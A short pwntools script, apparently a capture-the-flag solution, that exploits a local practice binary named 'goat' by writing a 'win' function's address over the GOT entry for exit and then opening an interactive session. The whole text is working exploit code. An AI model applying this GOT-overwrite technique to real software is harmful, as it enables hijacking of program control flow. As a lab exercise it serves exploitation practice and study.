from pwn import *

context.binary = "../goat"
p = process()

p.sendline(hex(context.binary.got["exit"]).encode("ascii"))
p.sendline(hex(context.binary.functions["win"].address).encode("ascii"))
p.interactive()